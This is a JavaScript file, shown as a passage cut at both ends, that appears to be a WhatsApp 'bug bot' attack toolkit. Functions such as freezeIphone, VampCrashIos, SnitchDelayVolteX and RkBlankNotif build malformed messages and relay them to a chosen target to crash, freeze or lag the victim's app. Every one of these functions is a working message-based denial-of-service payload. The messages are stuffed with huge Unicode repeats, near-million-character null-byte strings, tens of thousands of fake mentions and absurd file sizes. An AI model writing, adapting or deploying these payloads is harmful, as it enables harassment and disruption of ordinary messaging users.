                                    mimetype: "application/pdf"
                                }
                            ],
                            fileLength: "999999",
                            fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
                            fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
                            mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
                            directPath: "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
                            contextInfo: {},
                            packDescription: "~ 𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑 ~ ༘‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
                            mediaKeyTimestamp: "1741150286",
                            trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
                            thumbnailDirectPath: "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
                            thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
                            thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
                            thumbnailHeight: 252,
                            thumbnailWidth: 252,
                            imageDataHash: "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
                            stickerPackSize: "999999999",
                            stickerPackOrigin: "1"
                        }
                    }, {
                      participant : jid
                    });
}


async function spay(sock, jid) {
const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 70000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

  const message = {
    requestPaymentMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999", // Nilai besar
      requestFrom: jid,
      noteMessage: {
        extendedTextMessage: {
          text: "\u0000",
          contextInfo: {
            mentionedJid: mentionedList,
            forwardingScore: 999,
            isForwarded: true,
            quotedMessage: {
             message: {
                text: "Snitch Xopown",
                footer: "XxX",
                buttons: [{
                    buttonId:"\u0000".repeat(850000),    
                    buttonText: {
                        displayText: '~𑇂𑆵𑆴𑆿'.repeat(50000)
                    },
                    type: 1 
                }],
                headerType: 1,
                viewOnce: false
              }
            }
          }
        }
      },
      expiryTimestamp: "9999999999",
      amount: {
        value: "999999999",
        currencyCode: "USD"
      },
      contextInfo: {
        forwardingScore: 999,
        isForwarded: false
      }
    }
  };

await sock.relayMessage(jid, message, {
      participant : { jid: jid }
  });
}

async function freezeIphone(sock, jid) {
sock.relayMessage(
target,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: jid,
      participant: jid,
      quotedMessage: {
        conversation: "i p h o n e - f r e e z e" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 9999999471,
  },
},
{
  participant: {
    jid: jid,
  },
},
{
  messageId: null,
}
);
}

async function VampDelayMess(sock, jid) {
    const message = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: "9999999999999",
                            pageCount: 1316134911,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "xnxxx.com",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1726867151",
                            contactVcard: true,
                            jpegThumbnail: ""
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Vampire Is Back\n" + "@062598121203".repeat(17000)
                    },
                    nativeFlowMessage: {
                        buttons: [{
                            name: "cta_url",
                            buttonParamsJson: "{ display_text: 'Vampire Bot', url: \"https://youtube.com/@iqbhalkeifer25\", merchant_url: \"https://youtube.com/@iqbhalkeifer25\" }"
                        }, {
                            name: "call_permission_request",
                            buttonParamsJson: "{}"
                        }],
                        messageParamsJson: "{}"
                    },
                    contextInfo: {
                        mentionedJid: ["15056662003@s.whatsapp.net", ...Array.from({
                            length: 30000
                        }, () => "1" + Math.floor(Math.random() * 700000) + "@s.whatsapp.net")],
                        forwardingScore: 1,
                        isForwarded: true,
                        fromMe: false,
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "xvideos.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(jid, message, {
        participant: { jid: jid }
    });
}

async function VampiPhone(sock, jid) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: '33333333333333333@newsletter',
                                newsletterName: "Halo iPhone... Vampire Is Back" + "ꦾ".repeat(120000),
                                jpegThumbnail: renlol,
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await sock.relayMessage(jid, messsage, {
                    userJid: jid,
                });
            }
            catch (err) {
                console.log(err);
            }
        }


           async function VampCrashIos(sock, jid) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await sock.relayMessage(jid, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "iOs Crash          " + IphoneCrash,
                                           url: "https://youtube.com/@iqbhalkeifer25"
                                   }
                           }, {
                                   participant: {
                                           jid: jid
                                   }
                           });
                           console.log("Send Bug By Vampire");
                   } catch (error) {
                           console.error("Error Sending Bug:", error);
                   }
           }

async function SnitchDelayVolteX(sock, jid) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    // === BAGIAN PERTAMA: Radiactive ViewOnce + Sticker ===
    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂" + "ោ៝".repeat(10000),
        title: "𐍃𐌍𐌉𐌕𐌂𐌇 ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "Y7jQDWDPfQSIEJ34j3BFn6Ad4NLuBer0W3UTHwqvpc8=",
        fileLength: "5945180",
        seconds: 17,
        mediaKey: "4s+R9ADOCB3EUsrVDE6XbKWrUNv31GRuR/bo2z8U3DU=",
        height: 1280,
        width: 720,
        fileEncSha256: "hG/yZfURm4ryYYa0JUnHdNautOMsYGoFKDGd5/4OGLQ=",
        directPath: "/v/t62.7161-24/17606956_686071860479481_2023913755657097039_n.enc?ccb=11-4&oh=01_Q5Aa1QG9-CRTR3xBq-Vz4QoJnMZRKop5NHKdAB9xc-rN1ds8cg&oe=683FA8F9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1746415507",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
        },
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

    const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const radMsg1 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    const radMsg2 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    await sock.relayMessage("status@broadcast", radMsg1.message, {
        messageId: radMsg1.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", radMsg2.message, {
        messageId: radMsg2.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
            }]
        }]
    });

    // === BAGIAN KEDUA: protoTagFreezeCombo ===
    const comboMsg = await generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: crypto.randomBytes(32)
                },
                interactiveResponseMessage: {
                    body: {
                        text: "0@s.whatsapp.net ",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "0@s.whatsapp.net",
                        paramsJson: "\u0000".repeat(999999),
                        version: 3
                    },
                    contextInfo: {
                        isForwarded: true,
                        forwardingScore: 9999,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "TRIGGER SYSTEM",
                            newsletterJid: "120363321780343299@newsletter",
                            serverMessageId: 1
                        }
                    }
                }
            }
        }
    }, {});

    await sock.relayMessage("status@broadcast", comboMsg.message, {
        messageId: comboMsg.key.id,
        statusJidList: [jid],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
            }]
        }]
    });

    await sock.sendMessage(jid, {
        text: "𐍃𐌍𐌉𐌕𐌂𐌇 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂",
        mentions: mentionedList
    });
}

async function paymenX(jid) {
    try {
        const bugMessage = {
            viewOnceMessage: {
                message: {
                    requestPaymentMessage: {
                        currencyCodeIso4217: "XXX",
                        amount1000: 999999999,
                        noteMessage: {
                            extendedTextMessage: {
                                text: "Amelia",
                                contextInfo: {
                                    isForwarded: true,
                                    forwardingScore: 9741,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: "TheRilyzySixCoreX",
                                        newsletterJid: "120363309802495518@newsletter",
                                        serverMessageId: 1
                                    },
                                    mentionedJid: Array.from({ length: 40000 }, () =>
                                        "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                    ),
                                    businessMessageForwardInfo: {
                                        businessOwnerJid: "5521992999999@s.whatsapp.net"
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "SpectraNoiseX",
                                        paramsJson: "\u0000".repeat(999999)
                                    }
                                }
                            }
                        },
                        expiryTimestamp: Date.now() + 86400000,
                        requestFrom: "5521992999999@s.whatsapp.net"
                    }
                }
            }
        }

        await sock.relayMessage('status@broadcast', bugMessage.viewOnceMessage.message, {
            messageId: generateMessageID(),
            statusJidList: [jid],
            additionalNodes: [{
                tag: 'meta',
                attrs: {},
                content: [{
                    tag: 'mentioned_users',
                    attrs: {},
                    content: [{
                        tag: 'to',
                        attrs: { jid: jid },
                        content: undefined
                    }]
                }]
            }]
        })

    } catch (err) {
        console.log("Error:", err)
    }
}

async function PayXDocInvis(jid) {
    try {
        const bugMessage = {
            viewOnceMessage: {
                message: {
                    requestPaymentMessage: {
                        currencyCodeIso4217: "XXX",
                        amount1000: 999999999,
                        expiryTimestamp: Date.now() + 86400000,
                        requestFrom: "5521992999999@s.whatsapp.net",
                        noteMessage: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/octet-stream",
                                fileSha256: "TGm7yntjlt1nZjJ8wLE/xkuXxYFELupibDkZZD83k8Q=",
                                fileEncSha256: "QUlCoNMgSucbRYWuHe2vzIrSoUaH+py7zePvtaSshqk=",
                                fileLength: "99999999999",
                                mediaKey: "TS0xXvvf6a1p/3WzoCuV/qQ3c2JNbiX2FuunvFWdDcc=",
                                fileName: "© -!s RilzX7🐉",
                                mediaKeyTimestamp: "1748420423",
                                directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0",
                                contextInfo: {
                                    isForwarded: true,
                                    forwardingScore: 9999,
                                    forwardedNewsletterMessageInfo: {
                                        newsletterName: "TheRilyzyX7",
                                        newsletterJid: "120363309802495518@newsletter",
                                        serverMessageId: 1
                                    },
                                    mentionedJid: Array.from({ length: 40000 }, () =>
                                        "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                                    ),
                                    businessMessageForwardInfo: {
                                        businessOwnerJid: "5521992999999@s.whatsapp.net"
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "© -!s RilzX7",
                                        paramsJson: "\u0000".repeat(999999)
                                    }
                                }
                            }
                        }
                    }
                }
            }
        };

        await sock.relayMessage("status@broadcast", bugMessage.viewOnceMessage.message, {
            messageId: generateMessageID(),
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{
                        tag: "to",
                        attrs: { jid: jid },
                        content: undefined
                    }]
                }]
            }]
        });

    } catch (err) {
        console.log("Error:", err);
    }
}

async function protoxaudio2(jid, mention) {
    console.log(chalk.green("Protoxaudio Attack"));

    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/30660994_671452705709185_1216552849572997529_n.enc?ccb=11-4&oh=01_Q5Aa1gEtxyMxg-3KsoTrQJTn_0975yQMi4MrLxKv0Us-Yl2nBg&oe=685F9977&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from("aP7OzjZYQeT/660AyijlPDU+03vMOl4UJHg6qFU3lOM=", "base64"),
                    fileLength: 99999999999,
                    seconds: 24,
                    ptt: false,
                    mediaKey: Buffer.from("WQfLoSWy9BRY4dykp/MiEvFpgf2Gt+dJFswJ8hoVz6A=", "base64"),
                    fileEncSha256: Buffer.from("03TYnSxt5tzyF42T/K/cpg2DqP3FsQ0rN0u3q31iUMU=", "base64"),
                    directPath: "/v/t62.7114-24/30660994_671452705709185_1216552849572997529_n.enc?ccb=11-4&oh=01_Q5Aa1gEtxyMxg-3KsoTrQJTn_0975yQMi4MrLxKv0Us-Yl2nBg&oe=685F9977&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1748513902,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () =>
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        ),
                        isSampled: true,
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        text: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋" + "ោ៝".repeat(10000),
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "TheRilyzyX7",
                            newsletterJid: "120363309802495518@newsletter",
                            serverMessageId: 1
                        },
                        businessMessageForwardInfo: {
                            businessOwnerJid: "5521992999999@s.whatsapp.net"
                        },
                        nativeFlowResponseMessage: {
                            name: "© -!s RilzX7",
                            paramsJson: "\u0000".repeat(999999)
                        },
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/octet-stream",
                            fileSha256: Buffer.from("4c69bbca7b6396dd6766327cc0b13fc64b97c581442eea626c3919643f3793c4", "hex"),
                            fileEncSha256: Buffer.from("414942a0d3204ae71b4585ae1dedafcc8ad2a14687fa9cbbcde3efb5a4ac86a9", "hex"),
                            fileLength: 99999999999,
                            mediaKey: Buffer.from("4b2d315efbdfea6d69ffdd6ce80ae57fa90ddcd8935b897d85ba29ef15674371", "hex"),
                            fileName: "© -!s RilzX7🐉",
                            mediaKeyTimestamp: 1748420423,
                            directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0"
                        }
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(jid, generateMessage, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: jid },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(
            jid,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Amelia - INVISIBLE" },
                        content: undefined
                    }
                ]
            }
        );
    }
}

async function nolosios(sock, jid) {
sock.relayMessage(
jid,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: jid,
      participant: jid,
      quotedMessage: {
        conversation: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋 ͍𝐂͝𝐫𝐚᪳𝐬͠𝐡 " + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: jid,
  },
}, 
{
  messageId: null,
}
);
}

async function RInvisIphone(sock, jid) {
sock.relayMessage(
jid,
{
  extendedTextMessage: {
    text: "ꦾ".repeat(55000) + "@1".repeat(50000),
    contextInfo: {
      stanzaId: jid,
      participant: jid,
      quotedMessage: {
        conversation: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(50000),
      },
      disappearingMode: {
        initiator: "CHANGED_IN_CHAT",
        trigger: "CHAT_SETTING",
      },
    },
    inviteLinkGroupTypeV2: "DEFAULT",
  },
},
{
  paymentInviteMessage: {
    serviceType: "UPI",
    expiryTimestamp: Date.now() + 5184000000,
  },
},
{
  participant: {
    jid: jid,
  },
}, 
{
  messageId: null
}
);
}

async function RansCrashIos(sock, jid) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await sock.relayMessage(jid, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋 ͍𝐂͝𝐫𝐚᪳𝐬͠𝐡͢ 𝐈͡𝐎𝐒͜" + IphoneCrash,
                                           url: "https://youtube.com/@zahranDev"
                                   }
                           }, {
                              participant: { jid: jid }
                              });
                           console.log("Send Bug By Strom light");
                   } catch (error) {
                           console.error("Error Sending Bug:", error);
                   }
}

async function RansSupIos(sock, jid) {
      sock.relayMessage(
        jid,
        {
          extendedTextMessage: {
            text: `𝗧𝘄𝗲𝗹𝘃𝗲𝗳𝗼𝗿𝘁𝘂𝗻𝗲𝘀🦋 ios -` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: jid,
              participant: jid,
              quotedMessage: {
                conversation: "𝐵⃪𝐿⃪𝐴⃪𝑁⃪𝐾 𝐼⃪𝑂⃪𝑆 ‌" + "꧒꧆".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: jid,
          },
        },
        {
          messageId: null,
        }
      );
    }

async function BaccaratUi(sock, jid) {
  await sock.relayMessage(
    jid,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "9999999999999999",
                pageCount: 0x9184e729fff,
                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                fileName: "𝙲𝚁𝙰𝚂𝙷𝙴𝚁.",
                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                directPath:
                  "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1715880173",
                contactVcard: true,
              },
              title: "Hi.... Im Baccarat Of Teenager",
              hasMediaAttachment: true,
            },
            body: {
              text:
                "ꦽ".repeat(50000) +
                "_*~@8~*_\n".repeat(50000) +
                "@8".repeat(50000),
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
              groupMentions: [
                { groupJid: "0@s.whatsapp.net", groupSubject: "anjay" },
              ],
            },
          },
        },
      },
    },
    { participant: { jid: jid } },
    { messageId: null }
  );
}

async function RkBlankNotif(sock, jid, Ptcp = false) {
    let virtex =
        "sukiii " +
        "ꦽ".repeat(92000) +
        "_*~@8~*_\n".repeat(92000);

    await sock.relayMessage(
        jid,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                fileName: "©𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗙𝗶𝗹𝗲",
                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1726867151",
                                contactVcard: true,
                                jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: virtex,
                        },
                        nativeFlowMessage: {
                            name: "call_permission_request",
                            messageParamsJson: "\u0000",
                        },
                        contextInfo: {
                            mentionedJid: ["0@s.whatsapp.net"],
                            forwardingScore: 1,
                            isForwarded: true,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 1316134911,
                                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                    fileName: "Bokep ",
                                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
